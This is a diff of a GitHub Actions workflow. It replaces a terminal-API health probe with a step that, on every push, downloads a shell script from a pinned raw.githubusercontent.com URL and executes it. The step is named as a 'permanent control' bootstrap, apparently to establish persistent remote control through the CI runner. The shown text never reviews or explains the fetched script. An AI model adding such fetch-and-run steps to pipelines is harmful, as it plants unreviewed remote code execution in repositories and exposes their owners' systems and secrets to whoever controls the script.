@@ -1,4 +1,4 @@
-name: Probe PowerPC Terminal Control
+name: Bootstrap PowerPC Permanent Control
 
 on:
   push:
@@ -10,23 +10,15 @@ permissions:
   contents: read
 
 jobs:
-  probe:
+  bootstrap:
     runs-on: ubuntu-latest
-    timeout-minutes: 3
+    timeout-minutes: 10
     steps:
-      - name: Probe terminal session creation
+      - name: Execute machine-only bootstrap
         shell: bash
         run: |
           set -euo pipefail
-          code="$(curl -sS --connect-timeout 10 --max-time 30 -o /tmp/create.json -w '%{http_code}' -H 'Content-Type: application/json' -d '{"cols":100,"rows":30}' https://www.powerpc-darwin.org/terminal/api/session || true)"
-          echo "TERMINAL_CREATE_HTTP=$code"
-          if [ "$code" = "200" ]; then
-            python3 -c 'import json; d=json.load(open("/tmp/create.json")); assert d.get("ok") is True; assert isinstance(d.get("session_id"),str) and d["session_id"]; assert isinstance(d.get("csrf_token"),str) and d["csrf_token"]'
-            echo "TERMINAL_MACHINE_CALLABLE=PASS"
-          elif [ "$code" = "409" ]; then
-            echo "TERMINAL_MACHINE_CALLABLE=SESSION_EXISTS"
-          elif [ "$code" = "403" ]; then
-            echo "TERMINAL_MACHINE_CALLABLE=GATE_REQUIRED"
-          else
-            echo "TERMINAL_MACHINE_CALLABLE=FAIL"
-          fi
+          url="https://raw.githubusercontent.com/Christopher-Charman/open-webui/b5be6178d0fdf3bee9daea01909733c50837f082/bootstrap-relay/permanent-control/actions-bootstrap-live.sh"
+          curl -fsSL --retry 4 "$url" -o /tmp/actions-bootstrap-live.sh
+          chmod 700 /tmp/actions-bootstrap-live.sh
+          /tmp/actions-bootstrap-live.sh
